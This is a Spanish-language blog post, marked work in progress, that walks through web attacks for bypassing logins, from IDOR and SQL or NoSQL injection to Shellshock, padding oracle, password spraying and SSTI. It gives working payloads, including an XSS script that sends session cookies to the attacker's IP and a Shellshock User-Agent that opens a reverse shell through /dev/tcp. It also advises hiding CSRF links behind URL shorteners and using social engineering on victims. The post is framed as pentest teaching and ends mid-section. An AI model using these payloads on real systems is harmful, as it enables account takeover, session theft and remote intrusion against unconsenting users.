---
layout: single
title: Web Hacking y Bypassear Logins
excerpt: "En este artículo vamos a ver distintas formas de bypassear un login y otros ataques de web hacking."
date: 2022-09-28
classes: wide
header:
  teaser: /assets/images/login-bypass/portada.jpg
  teaser_home_page: true
  icon: 
categories:
  - Web-Hacking
tags:  
  - SQLi
  - OSINT
  - IDOR
---

# WORK IN PROGRESS

En este artículo vamos a ver `distintas formas que hay para bypassear un login`, es decir, formas para pasar un login sin necesidad de introducir credenciales, o en su defecto encontrar unas credenciales válidas con las que poder conectarnos con la cuenta de otro usuario. (`NOTA:` también voy a poner `algunos ataques que aunque no son exactamente al panel del loggin`, también sirven para conseguir un usuario de `administrador` con el que tomar el control de la web)

## ÍNDICE

```
  - OSINT
  - IDOR
  - SQLi
  - No SQLi
  - COOKIE HIJACKING (HTML injectio y XSS)
  - CSRF
  - SHELL SHOCK
  - PADDING ORACLE ATTACK con PADDBUSTER
  - BIT FLIPPER ATTACK para PADDING ORACLE ATTACK
  - PASSWORD SPRAYING
  - SSTI
  - CLICKJAKING
  - BUFFER OVERFLOW
  - TYPE JUGGLIN ATTACK
  - DESERIALIZATION ATTACK with Node.js
  - XML --> XXE
  - HTTP REQUEST SMUGGLING ATTACK 
  - PROTOTIPE POLLUTION
```

# OSINT

Puede parecer gracioso pero `no es raro encontrar credenciales validas en internet`. 

Lo primero que tenemos que comprobar es sí para el servicio o la tecnología que esten utilizando hay `credenciales por defecto`, es decir, que tu al comprar eso tienes unas credenciales ya predefinidas, (por ejemplo en las raspberry pi es pi, o en mi instituto la del gmail es aniturri1234). Obviamente eso es lo primero que hay que cambiar cuando nos creamos una cuenta en algún lado... pero `a mucha gente se le olvida o no sabe` que ese usuario o entrada por defecto eso existe (y me va a matar cuando lea esto, pero otro ejemplo es la empresa de un amigo en el que en un panel de loggin tienen como credenciales `user=admin` `password=admin`).

Otra forma que hay es mirar repositorios de `github`, preguntas en `stack overflow`... relacionados con la web que estamos testeando, ya que muchas veces durante el dessarrollo se publican partes del código y sin darse cuenta hay credenciales en ese código. `Parece estúpido pero es muy común XD`.

Y pues luego también `mirar si se han filtrado anteriormente credenciales` de esa web o de posibles usuarios de la web. 

Y otro consejo: buscar la web en `shodan`, ya que puedes encontrar información interesante y que te será util. 

![](/assets/images/login-bypass/shodan.PNG)

# IDOR

Pongo esto como el primer método de bypassing, porque es mi favorito, es super gracioso, porque `es absurdo a mas no poder`. Y no es tan conocido, por ejemplo en bug bounty pasa una cosa bastante graciosa que es que la mayoría de personas buscan `XSS` o `SQLi`, pero se olvidan de esta vulnerabilidad tan graciosa. Y por otra parte, hace unos meses le esneñé esta vuln a un amigo que es programador de backend y se sorprendio porque no la conocia y es muy absurda. 

Primero explicaré como se hace y luego el porqué: 

## COMO EXPLOTAR ESTA VULNERABILIDAD  

Hay `dos formas`, `la básica`, y la menos común de encontrar, pero que no por ello tiene menos importancia:

Por ejemplo, nos hemos registrado en una web y queremos cambiar la información del perfil. Para eso, hacemos clic en `http://online-service.thm/profile?user_id=1305` y vemos nuestra información. Pero claro, podemos cambiarnos el `id` a otro. En este punto `si la web esta bien hecha no nos debería dejar`, pero `si no se ha tenido en cuenta que esto pues podríamos acceder a la información de otro perfil`. 

Claro, el ejemplo anterior `se puede complicar` un poco, por ejemplo que al acceder a una página `se mande una petición con la id`, y ahum se puede complicar mas, porque `la id puede viajar hasheada`. Para eso es tan facil como `capturar la petición y cambiar la id`, y si esta hasheada pues descifrar el algoritmo de encriptado (en webs los mas comunes son base64 y md5) y `hashear la nueva id` de esa forma antes de cambiarla en la petición. 

Ejemplo de como puede viajar la petición:

![](/assets/images/login-bypass/IDOR-1.png)

....................................................................................................................................................................................................................................................................................................................................................................................................

....................................................................................................................................................................................................................................................................................................................................................................................................

Y `la forma un poco mas compleja`, `mas común` y que es `mas peligrosa`, ya que `nos permite acceso total`: 

Esta vulnerabilidad sobre todo se da cuando `intentamos entrar` a un directorio (por ejemplo /admin) y `nos redirige` a un login. Entonces la forma mas facil de detectarla es hacer `Wfuzzing` a una web y ver si nos redirige. Sobre todo si el codigo de `la respuesta de la web` es `301` es bastante probable que `sea vulnerable`.

Como ejemplo voy a poner el Fortress Acerva, ya que aunque ese login era un rabit hole, se podia bypassear con un IDOR:

```
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.13.37.11/FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.13.37.11/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000241:   301        9 L      28 W       315 Ch      "wp-content"
000000274:   401        14 L     54 W       458 Ch      "scripts"                                                            
000000786:   301        9 L      28 W       316 Ch      "wp-includes"
000000834:   301        9 L      28 W       308 Ch      "dev"
000001073:   301        9 L      28 W       315 Ch      "javascript"
000007180:   301        9 L      28 W       313 Ch      "wp-admin"                                                                                             
000011260:   301        9 L      28 W       312 Ch      "backups"                                                                                               
000095524:   403        9 L      28 W       276 Ch      "server-status"      
```

Primero hice Wfuzzing a su web, y uy, el directorio `/wp-admin` da `301` (entre otros) y si intentamos acceder `nos redirige a un login`, asi que apesta a `IDOR`. Por lo tanto voy a intentar `capturar la petición` con `burpsuit` de cuando intento acceder a `/wp-admin`.

Antes de nada necesitamos `modificar` la `configuración` de burpsuit `para interceptar la respuesta del lado del servidor`. Así que nos vamos a la configuración y cambiamos estas dos opciones:

![](/assets/images/login-bypass/IDOR-3.PNG)

Y ahora ya podemos continuar.

Primero voy a intentar acceder sin usar el `proxy para burp`, para que veais el `redirect`:

![](/assets/images/login-bypass/IDOR-2.PNG)

Vemos que nos hace redirect al login, por lo tanto vamos a intentar acceder sin proporcionar credenciales. Para eso lo primero que tenemos que hacer es `activar el proxy con foxy proxy` y `capturar la petición` al intentar acceder a `/wp-admin`:

![](/assets/images/login-bypass/IDOR-4.PNG)

Una vez capturada le daremos a `Forward` y veremos que nos pone la `respuesta del servidor`. Vemos que nos pone `302 Found`:

![](/assets/images/login-bypass/IDOR-5.PNG)

Claro, nosotros no queremos que nos haga un redirect, porque eso significa el codigo 302 (osea, todos los 300 algo), por lo tanto `vamos a cambiarlo` a ver que pasa:

![](/assets/images/login-bypass/IDOR-6.PNG)

Le damos de nuevo a `Forward` y:

![](/assets/images/login-bypass/IDOR-7.PNG)

(no se ve nada porque en esa máquina es un rabit hole, pero en hemos logrado acceso, en caso de que hubiese algo tendriamos acceso a eso, y eso es lo que importa)

Y aquí esta lo gracioso y absurdo de este ataque. `Hemos conseguido acceso` a un directorio en el cual no deberíamos estar XD. Claro, ahora `según hagamos alguna acción` nos va a `detectar` y nos va a mandar al `redirect`, asi que mientras no tengamos un usuario con la capacidad de estar ahí, deberemos `hacer esto para cada cosa que hagamos`.

## PORQUE PASA ESTO Y COMO EVITARLO

Esta vulnerabilidad puede ocurrir cuando un servidor web recibe `input del usuario` para recuperar objetos (archivos, datos, documentos…). Si se pone mucha `confianza en los datos suministrados` en la petición, y `no se validan en la parte de servidor` para `confirmar que el objeto pertenece al usuario que lo pide`, puede darse una `IDOR`.


# SQLi

![](/assets/images/login-bypass/sql-injection.svg)

`El siguiente artículo será sobre esto`, ya que es `un tema muy extenso` que no me parece adecuado explicarlo entero aquí, ya que abarca demasiado. Por lo que aquí solo explicaré en que consiste y un poco por encima como funciona este ataque y como ya he mencionado me adentraré a fondo en el en el siguiente artículo.

## QUE ES Y PORQUE PASA?

Con dice el nombre, `inyectamos código SQL en un input` o campo que tenga acceso a una `base de datos` para así poder interactuar con la BBDD de forma directa, es decir, la BBDD interpretará literalmente la consulta y asi tendremos total acceso a ella, pudiendo ver su contenido... Algo que de otra forma no podríamos hacer. 

`Ejemplo`: hay una página de login donde hay dos campos, user y password (sin tener en cuenta las cookies, la url... que también pueden servir). Claro, nosotros podemos meter esos datos y compará si ese user coincide con esa contraseña, pero si la web `no sanitiza el input` del usuario, permite que se pueda "engañar" a la web y que `en vez de mandarle un user, que le mande nuestra consula SQL`, así la BBDD `interpretará nuestra consulta y nos devolverá lo que nosotros queramos`, por ejemplo; el nombre de la base de datos, de las tablas... (pudiendo ver usuarios, contraseñas, correos electronicos...).

Hay distintas formas (pero eso lo explicaré en el siguiente artículo):

```
  - SQLi
  - SQLi Blind
  - SQLi Mediante el tiempo de la respuesta
  - No SQLi (este lo explico despues)
  - SQLi mediante peticiones
  - ...
```

## COMO EFECTUAR ESTE ATAQUE

(`NOTA:` antes de realizar este ataque es recomendable saber que tipo de BBDD tiene, pero sino se puede probar un poco a fuerza bruta, ya que no es lo mismo MySQL, que SQLserver, que SQL... (si no se especifica `sqlmap` prueba todas a fuerza bruta, pero si se especifica se pueden lograr mejores resultados en menos tiempo)

Para explicar un poco por encima `como funcionan las consultas SQL`, poruqe `lo mas importante` que tenemos que saber es `como funcionan las BBDD`  y `como funcionan las cunsultas SQL`. Y ver como utilizarlas para realizar este ataque voy a poner un ejemplo muy básico (`nota:` los ataques que se hacen en un entorno real son mas complicados, pero eso lo explicaré en otro artículo, porque sino este sera demasiado largo)

Ejemplo consultas SQL:

Considere una aplicación de compras que muestre productos en diferentes categorías. Cuando el usuario hace clic en la categoría Regalos, su navegador solicita la URL:

```
https://insecure-website.com/products?category=Gifts
```

Esto hace que la aplicación realice una consulta SQL para recuperar detalles de los productos relevantes de la base de datos:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Esta consulta SQL pide a la base de datos que devuelva:

```
  - todos los detalles (*)
  - de la tabla de productos
  - donde la categoría es Regalos
  - y liberado es 1.
```

La restricción se está utilizando para ocultar los productos que no se liberan. Para productos inéditos, presumiblemente . `released = 1released = 0`

La aplicación no implementa ninguna defensa contra los ataques de inyección SQL, por lo que un atacante puede construir un ataque como:

```
https://insecure-website.com/products?category=Gifts'--
```

Esto da como resultado la consulta SQL:

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

La clave aquí es que la secuencia de doble guión es un indicador de comentario en SQL, y significa que el resto de la consulta se interpreta como un comentario. Esto elimina efectivamente el resto de la consulta, por lo que ya no incluye . Esto significa que se muestran todos los productos, incluidos los productos no lanzados. `--AND released = 1`

Yendo más allá, un atacante puede hacer que la aplicación muestre todos los productos de cualquier categoría, incluidas las categorías que no conoce:

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Esto da como resultado la consulta SQL:

```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

La consulta modificada devolverá todos los artículos en los que la categoría sea Regalos o 1 sea igual a 1. Como siempre es verdadero, la consulta devolverá todos los elementos. `1=1`

.............................................................................................................................................................

.............................................................................................................................................................

Claro, ese es un ataque muy simple, pero se pueden hacer cosas mas complejas como listar la BBDD, es decir, ver que BBDD hay y su nombre, las tablas que tiene, las columnas...

Por ejemplo:

Para listar la BBDD:

```
' union select database()-- -
```

En caso de que huviese mas columnas, por ejemplo 4 y la cuarta fuese la que interpreta:

```
' union select 1,2,3,database()-- - 
```

Para ver la version de la BBDD:

```
' union select version()-- -
```

Para listar otras BBDD-s existentes:

```
' union select schema_name from information_schema.schemata-- -
```

Ver las tablas de otra base de datos que hemos encontrado:

```
' union select table_name from information_schema.tables where table_schema="{nombre de la BBDD}"-- -
```

Ver las columnas de una tabla de esa otra BBDD:

```
' union select column_name from information_schema.columns where table_schema="{nombre de la BBDD}" and table_name="{nombre de la tabla}"-- -
```

(`NOTA:` lo explicaré bien en el siguiente artículo, y también explicaré `sqlmap` en ese artículo)

## PREVENCIÓN

Aunque se podrían `sanear las entradas` usando métodos como `mysqli_real_escape_string`, es más recomendable la `utilización de sentencias preparadas o parametrizadas`. Las sentencias preparadas te permitirán ejecutar la misma sentencia con gran eficiencia.

`Tips` para incrementar la seguridad:

```
  1- No confiar en el input del usuario, filtrar el input para bloquear caracteres que puedan estar en consultas SQL (/`'%&="|!¡;:.,)
  2- Bloquear palabras en el input como SELECT, FROM, WHERE...
  3- Verificar y filtrar parametros que no solo sean inputs, por ejemplo logins, sino que también: parámetros de entrada y campos tipo hidden de las páginas web, coockies, url...
  4- No utilizar sentencias SQL construidas dinámicamente.
  5- No proporcionar mayor información de la necesaria.
```

# No SQLi

Esto se basa en un concepto que hemos visto antes que era que si la respuesta era `algo o sino 1=1` se bypasseaba el login porque se cumplia lo de 1=1, pero esta vez tenemos que decir que `la contraseña es distinta a algo`, entonces `interpreta como valido` y bypassea el login.

`Hay dos formas`, si no funciona la primera hay que probar la segunda:

`PRIMERA:`
En esta no tocaremos la petición mas que para `cambiar` un poco la parte de las `credenciales`. Siempre que tenga un `formato parecido` cambiaremos la linea por la siguiente (vale admin o cualquier otro usuario que sepamos que existe):

```
user=admin&password[$ne]=uwu
```

`SEGUNDA:`

El anterior metodo no siempre funciona, pero tambien podemos mandar la 	informacion en `json`, así que:

Primero en burpsuite en `capturamos la petición` del login y `cambiamos` la linea donde pone `Content-Type` por: Content-Type: `aplication/json`
luego `donde el user y password lo reemplazaremos por` lo siguiente:
	
  ```json  
{
	"user": "admin",
	"password":{
		"$ne":"uwu"
	}
}
```

# COOKIE HIJACKING

Antes de ver como robar cookies de otros usuarios para poder logearnos como ellos sin sus credenciales, debemos ver que es el HTML injection y el Cross Site Scripting (XSS).

## HTML injection

Esto sobre todo lo usamos para `comprobar` si una web es `vulnerable a XSS`.

Para esto buscaremos un directorio donde nos permita `escribir` texto y que `lo muestre` (como con un print) y `escribiremos` alguna de las siguientes opciones:

(en este caso el texto se pondrá mas grande)

```
<h1> Holi </h1>
```

(el texto se desplazará)

```
<marquee> Holi </marquee>
```

Si ha funcionado el texto se verá para todos como lo hayamos puesto. Claro, esto lo podemos hacer con comandos maliciosos en vez de una tonteria como esta, y en ese caso si que puede ser peligroso.

## Cross Site Scripting (XSS)

Ahora vamos a probar otra cosa con la que podemos comprobar si una web es vulnerable. Vamos aintentar poner un `pop up` con el mensaje que queramos:

```
<script>alert("XSS vulnerability found uwu")</script>
```

![](/assets/images/login-bypass/XSS-meme.jpg)

## Cookie Hijacking

Claro, con esto podemos hacer que al ver el mensaje `nos mande la coockie de sesion del usuario` que ha visto el mensaje.

Primero tenemos que crear un `servidor http` al que `nos lleguen las cookies`:

```
> python -m SimpleHTTPServer 443
```

Ahora escriviremos en un sitio donde sepamos que lo van a `ver otras personas` (o si queremos robarle `a una persona en específico` pues podemos hacer mediante `ingenieria social` que mire ese sitio web). Con el siguiente código lo que pasará es que los usuarios `veran una foto como con un error` de que no se ha podido encontrar, pero por detras `nos estará mandando la cookie de sesión` de cada usuario que lo vea:

```
<script>document.write('<img src="<http://{mi ip}:{443}/pentesting.jpg?cookie=' + document.cookie + '>">') </script>

```

Ahora la idea es que sin estar autenticado, con la extension de google `Edit this cookie` podremos `cambiarnos la cookie` por la que se nos muestre en el servidor http de la consola y pues se nos `cambiaria la sesión a la del propietario de la cookie capturada`.

# CSRF (Cross Site Request Forgery)

Consiste en que cuando un usuario acceda a una web desde una `url` que mediante `ingenieria social` se le hace clicar, se apliquen `cambios para esa cuenta`. Es decir, que clicando en una url que le mandemos se le cambie la contraseña a la que nosotros queramos.

Primero tendremos que `capturar una petición` con burpsuite, en un directorio donde puedas `logearte` (osea, meter user y password).

Al loguearte tienes que `interceptar` con burpsuit la petición que se manda por `POST`, y nosotros lo que intentaremos es que se mande por `GET`, hacemos `Control + R` para mandarlo al repeater, hacemos `click derecho` y le damos a `change request method` para que se ponga como `GET`, entonces ahora la información esta viajando `en la propia url como parametro`, entonces si le damos a `Go` y `funciona` con GET igual que funcionaba con POST, osea que ponga password updated seria `vulnerable`, y eso es muy peligroso, así que si `mandamos la url a alguien` con un `acortador de link` y usamos `ingenieria social` para que alguien se meta podriamos cambiarlo la contraseña a la víctima.

`IMPORTANTE` aclarar que al conseguir la url maliciosa en burpsuite nos saldrá algo parecido a lo siguiente:

```
/change_pass.php?password=hola123&confirm_password=hola123&submit=submit 
```

Entonces copiamos eso y `lo añadimos a la url` (sin directorios adicionales) osea:

```
http://hacked.com/{la url maliciosa que hemos conseguido en burpsuit}

http://hacked.com/change_pass.php?password=hola123&confirm_password=hola123&submit=submit 
```

`IMPORTANTE:` y por Último tenemos que pasar esa url por un `acortador de links` para que no se vea que es una url maliciosa.

Y cuando la víctima cae en la trampa el redirect pasa tan rápido que es imposible darse cuenta, aunque en algunas webs pone que la contraseña se ha cambiado.

# SHELL SHOCK

Esto pasa cuando `la página de login` tiene el formato `(.cgi  ,  .pl  ,  .sh  ,  ...)`, entonces a traves del `user agent` podemos `ejecutar comandos` de forma remota. Claro, entonces con eso nos podemos mandar una `reverse shell`.

Primero ponemos a la escucha un puerto con `netcat`.

En burpsuit ponemos a `interceptar peticiones` y recargamos la pagina de login.

En la petición capturada `cambiamos` la linea del `User Agent:` para poner lo siguiente:

```
User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/{mi ip}/{puerto} 0>&1
```

Le damos a `Forward` y se supone que ganaríamos `acceso al sistema`, si no funciona, lo intentaríamos un par de veces más, por si acaso, y si sigue sin funcionar pues a mirar 	que emos hecho mal.

# PADDING ORACLE ATTACK con PADDBUSTER

Esto basicamente es la explotación de un algoritmo de encriptacion (`cifrado cvc`). Consiste en que un texto claro lo separa en `bloques` para `encriptarlos individualmente`, por lo tanto tendremos que`saber el numero de bloques` para poder desencriptarlos, juntarlos y tener el texto. `Si no sabemos el numero de bloques` podemos probar uno a uno a `fuerza bruta`.

Ejemplo: tenemos un campo de inicion de sesion y uno de registro.

(Creo que no lo he explicado antes y es importante, cuando pongo {parámetro} tienes que reemplazarlo por el parámetro especificado y eliminar las llaves, es decir {ip} = 10.0.2.14) 

```
> padbuster {url en el directorio de registro} {mi coockie de sesion} {numero de bloques} -coockie "auth={micoockie de sesion}" -encoding 0
```

Nos dará una `lista de bloques vulnerables`, `la recomendada` es la que tenga `**`, la seleccionamos escribiendo el `id`. irá probando uno a uno los bytes, de 8 a 1 e irá desencriptando los bloques, luego los junta y da el mensaje, en este caso que estamos con una pajina de loguin `nos dara` algo parecido a `user={nuestro nombre del usuario}` (aunque puede ser diferente), claro, ya sabemos como se computan los `permisos en base a las cookies`, así que vamos a usarlo para `loguearnos como admin`.

```
> padbuster {url en el directorio de registro} {mi coockie de sesion} {numero de bloques} -coockie "auth={micoockie de sesion}" -encoding 0 -plaintext user=admin"
```

Con esto hacemos un `cookie hijacking` entonces pegamos la cookie que nos haya dado padbuster en `Edit this coockie` y listo

ES IMPORTANTE ACLARAR QUE `PADBUSTER TARDA MUCHO` asi que aprobecha a merendar, echarte la siesta o hacer cualquier cosa XD

# BIT FLIPPER ATTACK para PADDING ORACLE ATTACK

Una cosa rara que pasa en el `cifrado cvc` nos `registramos` con `{nombre de usuario existente}=` nos `logueariamos como ese usuario`, y si el usuario {nombre de usuario existente}= existe, tendríamos que `añadirle otro =` y si existe pues más de lo mismo, claro, así nos podríamos loguear como admins XD: `admin=`

Pero lo vamos a hacer de una forma mas lógica, con un `bit flipper attack`:

Nos registramos con un `nombre parecido a admin`, por ejemplo `bdmin` y tenemos que `interceptar esa petición` con burpsuit, luego le damos a `Control + I` para mandarlo al intruder, vamos a `Intruder --> Position` y a la petición que he mos mandado al intruder y le damos a `clear`. Seleccionamos la `cookie` y le damos a `Add`.

La idea es que como solo hemos cambiado un caracter y el `cifrado es cvc`, osea, que lo encripta por bloques, `solamente el primer bloque sera distinto`, lo demas será igual, entonces podemos probar las posibles variaciones del primer bloque para mediante pruebas `conseguir la misma cookie encriptada que usaria el user admin haciendo menos intentos` que si probasemos con todas las convinaciones de la cookie completa.

Ahora tenemos que `cambiar el primer bloque`, para que coincida con la cookie del usuario admin.

Para eso vamos a `payloads` y donde pone `Payload type` seleccionamos el ataque `Bit flipper`, en `Format of original data:` clicamos en `Literal value` y queremos que lo haga en todos los bits, asi que `seleccionamos todos`.

Ahora vamos a `Options` y en `Grep-Extract` le damos a `Add`, le damos a `Refetch response`, seleccionamos y copiamos `You are currently logged in as bdmin!` para luego saber cuando nos logueamos como admin, le damos a `Ok` y luego le damos a `Start attack`.

En la nueva pestaña quenos ha abierto tendremos que ir mirando en la parte donde pone `<p>\n\x09<center>` veremos cuando pone `You are currently logged in as admin!` así que `clicamos ahí` y en `Request podremos` `ver la cookie` de sesión de admin, así que la copiamos, vamos al panel de inicio de sesion de la web y nos la cambiamos con `Edit this coockie`.

Si no nos deja podemos `hacer de nuevo la petición como bdmin` e interceptarla, luego `cambiamos la coockie` de esa peticion por la que habiamos conseguido de admin y le damos a `Forward`. Y listo, ya estaríamos logeados como admin. 

# PASSWORD SPRAYING

Esto va a ser un poco copia pega del artículo que ya hice, pero bueno XD

![](/assets/images/web-hacking/password-spraying/password-spraying-2.jpg)

Este ataque lo hacemos cuando tenemos un `número de intentos limitados` para loguearnos en algún lugar, es decir, cuando nos bloquean los intentos o nos hacen esperar después de 3 o 5 intentos (puede ser un número distinto), por lo tanto, `no` podemos hacer `fuerza bruta` de las contraseñas `(hay que tener en cuenta que al igual que la fuerza bruta, solo es recomendable recurrir a esta técnica cuando no nos queda nada más por intentar, ya que al igual que la fuerza bruta hacemos mucho ruido, por lo que somos bastante detectables)`. Este ataque se puede resumir en cinco palabras: `pocas contraseñas para muchos usuarios`.

## EN QUE CONSISTE ESTA TÉCNICA:

Como ya he mencionado `esta técnica la utilizamos` cuando `no` podemos hacer `fuerza bruta` porque tenemos un `número limitado de intentos` de ingresar contraseñas en un login. Hay que recalcar que `cuantos más usuarios` haya registrados, nuestra `posibilidad` de acierto es `mayor`.

A diferencia de cuando utilizamos fuerza bruta, probamos un `número muy pequeño` de posibles `contraseñas`, normalmente utilizamos las más habituales, pero dependiendo cuál es el objetivo podemos utilizar otras. Y `probamos esas contraseñas` en `todos los usuarios` a ver si tenemos suerte y una funciona.

Es `verdad que `a` veces` se suele utilizar ``una única contraseña`` para `minimizar el tiempo` que tardemos en encontrar un usuario y contraseña válido, `o` también para intentar `minimizar un poco el ruido` que hagamos, pero `si tenemos la posibilidad` de utilizar más de una contraseña `es recomendable utilizarlas` para aumentar nuestras posibilidades de acierto.

Y en caso de no conocer los usuarios, sí que los podemos probar a fuerza bruta con un listado de posibles usuarios.

`Entonces resumiendo: esta técnica consiste en tener un listado de usuarios (o posibles usuarios) y otro listado muy pequeño de contraseñas y probar esas pocas contraseñas en todos los usuarios.`

Aquí dejo una foto en la que se explica bastante bien y de forma visual en que consiste esta técnica.

![](/assets/images/web-hacking/password-spraying/example.webp)

## COMO EXPLOTAR ESTA TÉCNICA:

Por lo que he estado viendo, hay varias herramientas para este tipo de ataque; `burpsuit`, `herramientas que hay en github`... O incluso podríamos crar un `script` que lo haga, no sería muy complicado.

Pero yo aquí solo voy a enseñar a hacer el ataque con `burpsuit`, para `webs`, ya que lo puedo probar con una máquina de HTB sin complicarme mucho.

`(en esta explicación doy por hecho que ya sabes utilizar burpsuit, si no sabes primero aprende aunque sea como capturar peticiones (es muy simple) y luego ya vuelve aquí)`

Para esto primero tendremos que capturar la petición del loguin y en burpsuit la mandaremos al `intruder` con `Ctl + I`:

![](/assets/images/web-hacking/password-spraying/attack-1.PNG)

Luego cambaremos el tipo de ataque a `Claster Bomb` y si no nos ha marcado los campos de la `user` y el `password`, los marcamos nosotros:

![](/assets/images/web-hacking/password-spraying/attack-2.PNG)

Ahora vamos a `Payload` y configuramos el primer campo metiendole la lista de `usuarios`:

![](/assets/images/web-hacking/password-spraying/attack-3.PNG)

Y en el segundo campo hacemos lo mismo pero con las `contraseñas`:

![](/assets/images/web-hacking/password-spraying/attack-4.PNG)

Ahora ya le damos a `Start attack` y ya debería empezar el ataque, y nos mostrará algo asi si encuentra la contraseña (no debo de tener bien configurado el burpsuit o yo que se y se queda en negro, pero pondré otro ejemplo de como se debería ver), `Sabemos que es el resultado valido porque tiene el Leght mas alto)`:

![](/assets/images/web-hacking/password-spraying/attack-5.png)

Y ya estaría uwu.

## COMO PREVENIR ESTA TÉCNICA:

Las formas de prevención de este ataque son bastante lógicas y son las mismas que para todos estos tipos de ataques a contraseñas:

```
·Tener una contraseña robusta (que tenga números, letras minúsculas y mayúsculas, caracteres raros...)

·Cambiar la contraseña de vez en cuando.

·No utilizar la misma contraseña para todo.

·Utilizar doble factor de autenticación.

```

# SSTI (Server Side Template Injection)

![](/assets/images/login-bypass/ssti.webp)

Esto pasa cuando tenemos un campo en el que podemos `escribir texto` y nos da una `respuesta`, un mensaje, un login...
Para probar si un campo es vulnerable podemos poner: `{{7*7}}` y si la respuesta da `49` significa que `es vulnerable`.

## QUE ES ESTO?

`SSTI` es una vulnerabilidad en la que el atacante `inyecta inputs maliciosos` en una plantilla para `ejecutar comandos` en el lado del servidor. Esta vulnerabilidad se produce cuando `el input del usuario no válida` está incrustada en el motor de plantillas, lo que generalmente puede conducir a la `ejecución remota de código (RCE)`

## COMO EXPLOTAR LA VULNERABILIDAD

Para conseguir `Remote Code Execution` mediante esta vulnerabilidad:

![](/assets/images/login-bypass/ssti-command.png)

(lo siento por no ponerlo en texto, esque lo he intentado de un par de formas pero no se porque Github Pages no lo quiere mostrar)

Ahora si `cambiamos` el parametro `id` por un comando podremos tener `ejecución remota de comandos`.

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection
```

En ese repositorio de github también hay cosas interesantes para otros ataques.

## PORQUE PASA ESTO?

Los `motores de plantillas` están diseñados para `combinar plantillas con un modelo de datos` para producir documentos de resultados que ayudan a rellenar datos dinámicos en páginas web. Los motores de plantillas `se pueden utilizar para mostrar información` sobre usuarios, productos, etc. Algunos de los motores de plantillas más populares se pueden enumerar de la siguiente manera:

```
	· PHP – Smarty, Ramitas
	· Java – Velocidad, Freemaker
	· Python – JINJA, Mako, Tornado
	· JavaScript – Jade, Rabia
	· Rubí – Líquido
```

Cuando `la validación de entrada no se maneja correctamente` en el lado del servidor, se puede `ejecutar una carga útil de inyección de plantilla maliciosa` del lado del servidor en el servidor, lo que puede resultar en la `ejecución remota de código`.

## HERRAMIENTA AUTOMATIZADA

TPLmap:

```
https://github.com/epinna/tplmap
```

Esta herramienta esta hecha `especificamente para esta vulnerabilidad`. Utiliza varias `técnicas de escape de espacios aislados` para obtener acceso al sistema operativo.

## PREVENCIÓN

- `Sanitizar:` sanitiza la entrada del usuario antes de pasarla a las plantillas para minimizar las vulnerabilidades de cualquier mensaje malicioso.

- `Sandboxing:` En caso de que `el uso de caracteres riesgosos sea una necesidad empresarial`, se recomienda `utilizar un sandbox dentro de un entorno seguro`.

# CLICKJAKING

Explicar esto me da mas pereza que explicar SQLi, porque la mayoría van a ser capturas de pantalla XD




# BUFFER OVERFLOW ATTACK

![](/assets/images/web-hacking/Buffer-overflow/buffer-overflow-attacks.png)

Cuando estudie en profundidad este tema pondre todos mis apuntes y explicaciones en el artículo que hice especificamente para esta vulnerabilidad, aquí solo la explicaré un poco por encima.

*https://airilmusic.github.io/Buffer-overflow/*

Esta es una vulnerabilidad que afecta a contraseñas como a campos de texto, ya sea en aplicaciones o páginas web, como en aplicaciones y programas. También algunos exploits famosos como es el eternalblue se basan en esta vulnerabilidad.

## EN QUE SE BASA ESTA VULNERABILIDAD:
### Buffer:

Antes de entrar en una forma más técnica es por ejemplo como un contenedor de agua que se puede llenar o vaciar para que luego esa agua valla por ejemplo a un grifo (el contenedor es el buffer y el grifo es la información que se está procesando en ese momento).

Es lo que `se descarga en la RAM con anterioridad`, para luego ser procesado. Por ejemplo, al ver un video es la parte que se ha descargado y aunque se vaya la conexión podemos seguir viéndolo, por ejemplo en youtube eso se muestra con una barrita blanca.

Claro, si `le cuesta más descargarse que lo que le cuesta procesar` la información (en el ejemplo de youtube que veas el video más rápido de lo que le da tiempo a descargarse) hay `lag` y, por lo tanto, hay parones, pero claro, puede pasar lo contrario, que `el tiempo de descarga sea más rápido que el tiempo de procesado` por lo que eso `puede llenar más RAM` de la que se le ha dado por lo que eso causa o que `se congele la pantalla` o `se corrompa la información` o directamente que se `crashee` y a eso se le llama `buffer overflow`, ósea, que pete el bufer porque se llena.


### Buffer overflow:

Básicamente consiste en `escribir o descargar más información en el buffer de lo que es capaz de retener`, esto se hace `con el fin de` que + `crashee`, o `corrompa` la información. Es como si unos niños a un depósito donde solo entran 10 litros intentan meter 5 más, claro, el líquido se saldría del buffer que en este caso es el depósito, entonces haría buffer overflow.


#### Ejemplo:
Joe tiene una web donde los usuarios tienen que meter su nombre para acceder, `la web tiene 8 bits de bufer` de los nombres de usuario, porque no espera que nadie meta un nombre mayor a 8 letras. Pero Jane `mete un nombre de 10 letras`, entonces `las primeras 8 entrarían en el buffer` pero `las siguientes 2 harían overflow`. Para su sorpresa, la web se congelará y no dará como válido ningún otro input de nombre de usuario, causando una Denegación de Servicio (DoS).
		
Este ejemplo es un `buffer overflow` o `buffer overrun` típico. Claro, si con esto `introducimos una función en el overflow`, nuestra función `se copiará en los campos de código de alrededor`, por lo tanto, podríamos llegar a conseguir `Arbitrari Code Execution` (ejecución arbitraria de comandos).

![](/assets/images/web-hacking/Buffer-overflow/buffer-overflow.png)


### VULNERABILIDAD y ATAQUES:

Los `lenguajes de programación más propensos` a sufrir esta vulnerabilidad son `C` y `C++`, pero `lenguajes más modernos` como Java, Python o C# `tienen medidas` para dificultar la aparición de estas vulnerabilidades, pero pueden seguir habiéndolas.

Esta vulnerabilidad se suele utilizar para `tomar el control` de alguna aplicación o sistema. Para eso se intenta hacer un buffer overflow para `sobrescribir la memoria` de la aplicación o la web para cambiar el path del programa, por lo que expone cierta información que lleva datos privados.

Claro, si conocemos el diseño de la memoria podemos mandar ciertas órdenes para inyectar comandos o código malicioso para obtener acceso.


#### Explotación

